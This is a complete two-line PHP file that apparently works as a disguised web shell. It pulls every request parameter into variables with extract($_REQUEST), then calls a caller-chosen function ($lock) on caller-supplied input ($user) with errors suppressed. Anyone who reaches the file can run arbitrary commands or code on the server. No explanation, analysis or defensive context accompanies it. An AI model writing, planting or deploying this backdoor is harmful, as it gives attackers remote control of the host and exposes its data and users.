<?php
extract($_REQUEST) && @$lock(stripslashes($user)) && exit;